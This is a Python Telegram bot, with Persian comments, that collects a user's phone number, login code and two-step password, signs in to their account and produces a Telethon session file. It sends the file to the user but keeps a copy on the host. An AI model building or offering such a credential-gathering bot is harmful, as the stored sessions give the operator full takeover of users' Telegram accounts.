import os
import asyncio
import sys
from telethon import TelegramClient, events
from telethon.tl.types import Message
from telethon.errors import SessionPasswordNeededError

# ==================== تنظیمات اولیه ====================
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

# بررسی وجود توکن
if not BOT_TOKEN or not API_ID or not API_HASH:
    print("❌ ERROR: Missing environment variables!")
    print("Please set API_ID, API_HASH, and BOT_TOKEN")
    sys.exit(1)

# دیکشنری برای ذخیره وضعیت کاربران
user_sessions = {}

# ==================== بخش HTTP Server ====================
try:
    from aiohttp import web
    import socket
    
    async def health_check(request):
        """Endpoint ساده برای بررسی سلامت ربات"""
        return web.Response(text="✅ Bot is running!", status=200)
    
    async def run_web_server():
        """اجرای web server روی پورت مشخص شده"""
        port = int(os.environ.get("PORT", 8080))
        
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        
        print(f"🌐 Web server running on port {port}")
        
        # نگه داشتن سرور تا زمانی که ربات فعال است
        while True:
            await asyncio.sleep(3600)  # sleep برای 1 ساعت
    
except ImportError:
    print("⚠️ aiohttp not installed. Web server disabled.")
    
    async def run_web_server():
        """اگر aiohttp نصب نیست، یک تابع دامی اجرا کن"""
        port = int(os.environ.get("PORT", 8080))
        print(f"⚠️ Web server not available, but port {port} is configured.")
        while True:
            await asyncio.sleep(3600)

# ==================== کلاس اصلی ربات ====================
class SessionBot:
    def __init__(self):
        self.bot = TelegramClient(
            'session_bot',
            API_ID,
            API_HASH,
            device_model="Windows 11",
            system_version="Windows 11",
            app_version="Telegram Desktop",
            lang_code="en",
            system_lang_code="en-US"
        )
        self.temp_clients = {}

    async def start(self):
        # شروع ربات با توکن
        await self.bot.start(bot_token=BOT_TOKEN)
        print("🤖 ربات راه‌اندازی شد!")
        
        # نمایش اطلاعات ربات
        me = await self.bot.get_me()
        print(f"✅ ربات با نام @{me.username} آماده است!")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_command(event):
            user_id = event.sender_id
            
            session_name = f"user_{user_id}"
            session_path = os.path.expanduser(f"~/sessions/{session_name}")
            
            client = TelegramClient(
                session_path,
                API_ID,
                API_HASH,
                device_model="Windows 11",
                system_version="Windows 11",
                app_version="Telegram Desktop",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            self.temp_clients[user_id] = {
                'client': client,
                'session_path': session_path,
                'session_name': session_name,
                'step': 'phone',
                'code': '',
                'phone': None,
                'code_length': 5,
                'message_id': None
            }
            
            await event.respond(
                "👋 به ربات ساخت سشن خوش آمدید!\n\n"
                "📱 لطفاً شماره تلفن خود را با کد کشور وارد کنید.\n"
                "مثال: +989123456789"
            )

        @self.bot.on(events.NewMessage)
        async def handle_messages(event):
            if event.is_private and event.text and not event.text.startswith('/'):
                user_id = event.sender_id
                
                if user_id not in self.temp_clients:
                    await event.respond("❗ لطفاً ابتدا /start را بزنید.")
                    return
                
                user_data = self.temp_clients[user_id]
                step = user_data['step']
                client = user_data['client']
                
                try:
                    if step == 'phone':
                        phone = event.text.strip()
                        
                        await client.connect()
                        
                        if not await client.is_user_authorized():
                            try:
                                await client.send_code_request(phone)
                                user_data['phone'] = phone
                                user_data['step'] = 'code'
                                user_data['code'] = ''
                                
                                await self.show_code_panel(event, user_data)
                                
                            except Exception as e:
                                await event.respond(f"❌ خطا: {str(e)}")
                        else:
                            await event.respond("⚠️ این شماره قبلاً تأیید شده است!")
                
                except Exception as e:
                    await event.respond(f"❌ خطای غیرمنتظره: {str(e)}")

        @self.bot.on(events.CallbackQuery)
        async def handle_callback(event):
            user_id = event.sender_id
            
            if user_id not in self.temp_clients:
                await event.answer("❗ لطفاً ابتدا /start را بزنید.", alert=True)
                return
            
            user_data = self.temp_clients[user_id]
            data = event.data.decode()
            
            if user_data['step'] == 'code' or user_data['step'] == '2fa':
                await self.handle_code_input(event, user_data, data)

        # اجرای ربات تا زمان قطع شدن
        await self.bot.run_until_disconnected()

    async def show_code_panel(self, event, user_data):
        """نمایش پنل شیشه‌ای وارد کردن کد"""
        step = user_data['step']
        code = user_data['code']
        
        if step == '2fa':
            code_length = 0
            title = "🔐 رمز عبور دو مرحله‌ای را وارد کنید:"
            placeholder = "••••••••"
        else:
            code_length = user_data.get('code_length', 5)
            title = "📝 کد تأیید را وارد کنید:"
            placeholder = "_" * code_length
        
        if step == '2fa':
            display_code = "•" * len(code) if code else placeholder
        else:
            display_code = code if code else placeholder
            if len(code) < code_length:
                display_code = code + "_" * (code_length - len(code))
        
        buttons = []
        
        # دکمه‌های 1-9
        row = []
        for i in range(1, 10):
            row.append((str(i), f"code_{i}"))
            if i % 3 == 0:
                buttons.append(row)
                row = []
        
        # ردیف آخر
        buttons.append([
            ("🗑️ پاک کردن", "code_clear"),
            ("0", "code_0"),
            ("✅ تأیید", "code_submit")
        ])
        
        keyboard = []
        for row in buttons:
            keyboard.append([{
                'text': text,
                'callback_data': callback_data
            } for text, callback_data in row])
        
        if step == '2fa':
            message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن رمز استفاده کنید:"
        else:
            message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن کد استفاده کنید:"
        
        if user_data.get('message_id'):
            try:
                await self.bot.edit_message(
                    event.chat_id,
                    user_data['message_id'],
                    message_text,
                    parse_mode='markdown',
                    buttons=keyboard
                )
            except:
                msg = await event.respond(
                    message_text,
                    parse_mode='markdown',
                    buttons=keyboard
                )
                user_data['message_id'] = msg.id
        else:
            msg = await event.respond(
                message_text,
                parse_mode='markdown',
                buttons=keyboard
            )
            user_data['message_id'] = msg.id
        
        await event.answer()

    async def handle_code_input(self, event, user_data, data):
        """پردازش ورودی‌های پنل کد"""
        code = user_data['code']
        step = user_data['step']
        code_length = user_data.get('code_length', 5)
        
        if data.startswith('code_'):
            action = data.split('_')[1]
            
            if action == 'clear':
                if code:
                    user_data['code'] = code[:-1]
                await self.show_code_panel(event, user_data)
                await event.answer()
                
            elif action == 'submit':
                if step == '2fa':
                    if len(code) < 1:
                        await event.answer("❗ لطفاً رمز عبور را وارد کنید.", alert=True)
                        return
                    await self.verify_2fa(event, user_data)
                else:
                    if len(code) != code_length:
                        await event.answer(f"❗ لطفاً کد {code_length} رقمی را کامل وارد کنید.", alert=True)
                        return
                    await self.verify_code(event, user_data)
                
            elif action.isdigit():
                if step == '2fa':
                    user_data['code'] = code + action
                else:
                    if len(code) < code_length:
                        user_data['code'] = code + action
                    else:
                        await event.answer(f"❗ کد {code_length} رقمی کامل شد.", alert=True)
                        return
                await self.show_code_panel(event, user_data)
                await event.answer()

    async def verify_code(self, event, user_data):
        """تأیید کد ورود"""
        code = user_data['code']
        phone = user_data['phone']
        client = user_data['client']
        
        try:
            await client.sign_in(phone, code)
            
            await event.answer("✅ تأیید کد با موفقیت انجام شد!", alert=True)
            
            session_file = user_data['session_path'] + ".session"
            
            if os.path.isfile(session_file):
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                if user_data.get('message_id'):
                    try:
                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
                    except:
                        pass
                
                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                
                del self.temp_clients[event.sender_id]
            else:
                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                
        except SessionPasswordNeededError:
            user_data['step'] = '2fa'
            user_data['code'] = ''
            await event.answer("🔐 نیاز به رمز عبور دو مرحله‌ای!", alert=True)
            await self.show_code_panel(event, user_data)
            
        except Exception as e:
            error_msg = str(e)
            if "PHONE_CODE_INVALID" in error_msg:
                user_data['code'] = ''
                await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
                await self.show_code_panel(event, user_data)
            elif "CODE_EXPIRED" in error_msg:
                await event.answer("❌ کد منقضی شده است. دوباره /start را بزنید.", alert=True)
                del self.temp_clients[event.sender_id]
            else:
                await event.answer(f"❌ خطا: {error_msg}", alert=True)

    async def verify_2fa(self, event, user_data):
        """تأیید رمز 2FA"""
        password = user_data['code']
        client = user_data['client']
        
        try:
            await client.sign_in(password=password)
            
            await event.answer("✅ تأیید رمز با موفقیت انجام شد!", alert=True)
            
            session_file = user_data['session_path'] + ".session"
            
            if os.path.isfile(session_file):
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                if user_data.get('message_id'):
                    try:
                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
                    except:
                        pass
                
                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                
                del self.temp_clients[event.sender_id]
            else:
                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                
        except Exception as e:
            error_msg = str(e)
            if "PASSWORD_HASH_INVALID" in error_msg or "SRP_ID_INVALID" in error_msg:
                user_data['code'] = ''
                await event.answer("❌ رمز عبور اشتباه است! دوباره تلاش کنید.", alert=True)
                await self.show_code_panel(event, user_data)
            else:
                await event.answer(f"❌ خطا: {error_msg}", alert=True)

# ==================== اجرای اصلی ====================
async def main():
    # ایجاد پوشه سشن‌ها
    os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
    
    # ایجاد نمونه ربات
    bot = SessionBot()
    
    # اجرای همزمان ربات و سرور وب
    try:
        # شروع ربات
        bot_task = asyncio.create_task(bot.start())
        
        # شروع سرور وب
        web_task = asyncio.create_task(run_web_server())
        
        # منتظر ماندن تا اولین تسک تمام شود (معمولاً هیچکدام تمام نمی‌شوند)
        done, pending = await asyncio.wait(
            [bot_task, web_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        
        # اگر یکی از تسک‌ها تمام شد، بقیه را لغو کن
        for task in pending:
            task.cancel()
            
    except KeyboardInterrupt:
        print("\n🛑 ربات متوقف شد.")
    except Exception as e:
        print(f"❌ خطا: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 برنامه با Ctrl+C متوقف شد.")
    except Exception as e:
        print(f"❌ خطای اجرا: {e}")
        sys.exit(1)
